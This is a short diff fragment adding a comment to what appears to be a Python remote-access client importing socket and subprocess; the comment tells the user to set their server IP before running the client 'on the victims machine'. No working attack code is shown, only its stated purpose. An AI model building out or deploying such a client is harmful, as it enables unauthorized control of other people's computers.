@@ -1,3 +1,5 @@
+#please change the server_ip variabale according to the your server ip before executing the client code on the victims machine
+
 import socket
 import time
 import subprocess
